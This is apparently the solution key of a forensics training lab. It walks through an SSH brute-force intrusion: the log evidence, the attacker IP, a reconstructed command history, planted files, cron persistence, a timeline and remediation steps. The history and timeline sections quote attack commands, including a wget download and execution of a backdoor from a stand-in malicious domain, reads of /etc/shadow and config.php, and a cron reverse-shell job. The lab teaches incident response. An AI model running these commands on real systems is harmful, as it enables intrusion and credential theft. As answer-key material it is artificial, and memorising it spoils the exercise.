# FORENSICS LAB - SOLUTION

## EXPECTED ANSWERS

### 1. WHEN did the attack begin?

**Expected Answer:** Approximately 1 hour ago (exact time depends on when you connected)

**How to discover:**
```bash
$ sudo cat /var/log/auth.log | tail -50
```

You will see lines like:
```
Mar 14 19:30:15 server sshd[1234]: Invalid user attacker from 203.45.67.89 port 54321
Mar 14 19:30:20 server sshd[1235]: Failed password for invalid user attacker from 203.45.67.89
Mar 14 19:31:10 server sshd[2000]: Accepted password for ubuntu from 203.45.67.89 port 54330
```

**Indicator**: The successful login ("Accepted password") marks the beginning of access

---

### 2. HOW did the attacker get in?

**Expected Answer:** SSH Brute Force Attack

**Evidence:**
```
Multiple "Failed password" entries
One "Accepted password" entry
Source: 203.45.67.89
```

**Why was it possible?**
- Weak password for user `ubuntu`
- No SSH rate limiting
- No 2FA/MFA

---

### 3. WHAT is the attacker's IP?

**Expected Answer:** 203.45.67.89

**How to discover:**
```bash
$ grep "from 203" /var/log/auth.log
```

All attacks come from this IP.

---

### 4. WHAT did the attacker do?

**Expected Answer:** (see ~/.bash_history)

**Sequence of actions:**
```
1. ls -la                          (Reconnaissance)
2. whoami                           (Discover user)
3. sudo su -                        (Try privilege escalation)
4. cd /tmp                          (Navigate to /tmp)
5. wget https://malicious-domain.com/backdoor.sh  (Download malware)
6. chmod +x backdoor.sh             (Make executable)
7. ./backdoor.sh                    (Execute backdoor)
8. mkdir .hidden                    (Create hidden directory)
9. mv backdoor.sh .hidden/monitor.sh (Move to hidden location)
10. crontab -l                      (View user cron)
11. crontab -e                      (Edit cron)
12. sudo crontab -l                 (View root cron)
13. sudo crontab -e                 (Edit root cron)
14. cat /etc/passwd                 (Extract users)
15. cat /etc/shadow                 (Try to extract hashes)
16. find / -type f -name "*.conf"   (Search config files)
17. ls -la /home/                   (Explore directories)
18. ls -la /root/                   (Try to access root)
19. cd /var/www                     (Look for web app)
20. cat config.php                  (Extract credentials)
21. exit                            (Disconnect)
```

---

### 5. WHICH files were created/modified?

**Expected Answer:**

```bash
$ find / -mmin -60 2>/dev/null
```

You will see:
```
/tmp/.hidden/                       (Directory created)
/tmp/.hidden/monitor.sh             (Backdoor script)
/tmp/.system-check                  (Reverse shell script)
/tmp/update.py                      (Python backdoor)
/tmp/.dataexport                    (Stolen data list)
/tmp/sudo_abuse                     (Sudo rule)
/var/spool/cron/crontabs/root      (Cron modified)
/home/ubuntu/.bash_history          (History modified)
/root/.bash_history                 (Root history modified)
```

---

### 6. Is the attacker still there?

**Expected Answer:** YES (backdoor installed)

**How to discover:**
```bash
$ ps aux | grep monitor
$ ps aux | grep update.py
```

Or check cron jobs:
```bash
$ sudo crontab -l
```

You will see:
```
*/15 * * * * /tmp/.hidden/monitor.sh > /dev/null 2>&1
```

**Meaning**: Every 15 minutes, the backdoor attempts to establish reverse connection

---

### 7. COMPLETE TIMELINE

```
═══════════════════════════════════════════════════════════════

FORENSICS TIMELINE - GLOBOMANTICS INCIDENT

═══════════════════════════════════════════════════════════════

[19:30] ATTACK BEGINS
────────────────────────────────────────────────────────────
19:30:15 - First failed SSH attempt (Invalid user "attacker")
19:30:20 - Continued SSH brute force attempts
19:30:30 - More failed password attempts
          Attacker testing username "ubuntu"
19:31:00 - Brute force continues with different ports
19:31:10 - SUCCESSFUL LOGIN - Attacker gains access as ubuntu
          Source IP: 203.45.67.89
          Port: 54330
          Method: SSH password authentication

[19:31-19:35] RECONNAISSANCE PHASE
────────────────────────────────────────────────────────────
19:31:20 - Attacker checks: ls -la
19:31:30 - Attacker checks: whoami (confirms ubuntu user)
19:31:40 - Attacker attempts: sudo su - (privilege escalation)
19:32:00 - Attacker navigates to /tmp
19:32:10 - Attacker downloads backdoor script
          wget https://malicious-domain.com/backdoor.sh
19:32:30 - Attacker makes script executable: chmod +x
19:32:40 - Attacker executes backdoor: ./backdoor.sh
19:33:00 - Attacker creates hidden directory: mkdir .hidden
19:33:10 - Attacker moves backdoor to hidden location

[19:33-19:35] DATA EXFILTRATION PHASE
────────────────────────────────────────────────────────────
19:33:20 - Attacker extracts system users: cat /etc/passwd
19:33:30 - Attacker extracts password hashes: cat /etc/shadow
19:33:40 - Attacker searches for config files
          find / -type f -name "*.conf"
19:34:00 - Attacker explores /home and /root directories
19:34:20 - Attacker checks /var/www for web applications
19:34:40 - Attacker extracts database credentials: cat config.php

[19:34-19:35] PERSISTENCE PHASE
────────────────────────────────────────────────────────────
19:34:50 - Attacker views cron jobs: crontab -l
19:35:00 - Attacker edits cron: crontab -e
          Adds: */15 * * * * /tmp/.hidden/monitor.sh
19:35:10 - Attacker edits root cron: sudo crontab -e
          Adds same reverse shell mechanism
19:35:15 - Backdoor installed and will execute every 15 minutes

[19:35] ATTACK ENDS
────────────────────────────────────────────────────────────
19:35:30 - Attacker disconnects: exit
19:35:45 - But backdoor remains active in cron

[PRESENT] ONGOING THREAT
────────────────────────────────────────────────────────────
- Backdoor script still in /tmp/.hidden/monitor.sh
- Cron job executes every 15 minutes
- Attacker can reconnect via cron reverse shell
- Database credentials compromised
- System users and password hashes exposed
- Sensitive configuration files may have been copied

═══════════════════════════════════════════════════════════════
TOTAL ATTACK DURATION: ~5 minutes
SYSTEM COMPROMISED FOR: 1 hour (and counting)
BACKDOORS INSTALLED: YES (2 cron jobs)
RISK LEVEL: 🔴 CRITICAL
═══════════════════════════════════════════════════════════════
```

---

## IMMEDIATE RECOMMENDATIONS

### 1. CONTAINMENT (Now)
- [ ] Isolate server from network
- [ ] Kill attacker processes (if still running)
- [ ] Rotate database credentials
- [ ] Notify users about possible breach

### 2. REMOVAL (Next 2 hours)
- [ ] Remove file `/tmp/.hidden/monitor.sh`
- [ ] Remove file `/tmp/.system-check`
- [ ] Remove file `/tmp/update.py`
- [ ] Remove malicious cron jobs
- [ ] Change ubuntu user password
- [ ] Rotate root SSH keys

### 3. RECOVERY (Next 24 hours)
- [ ] Restore server from clean backup
- [ ] Rotate all credentials
- [ ] Enable advanced monitoring
- [ ] Implement SSH rate limiting
- [ ] Implement 2FA for SSH
- [ ] Update operating system

### 4. PREVENTION (Next 1-2 weeks)
- [ ] Deploy WAF
- [ ] Implement IDS/IPS
- [ ] Configure auditd
- [ ] Implement SIEM
- [ ] Perform security hardening
- [ ] Implement compliance scanning

---

## INVESTIGATION CHECKLIST

- [x] Analyze authentication logs
- [x] Identify first suspicious access
- [x] Track attacker IP
- [x] Analyze command history
- [x] Find suspicious files
- [x] Check cron jobs
- [x] Identify backdoors
- [x] Calculate impact
- [x] Document timeline
- [x] Preserve evidence

---

**Investigation Complete!** 🎉
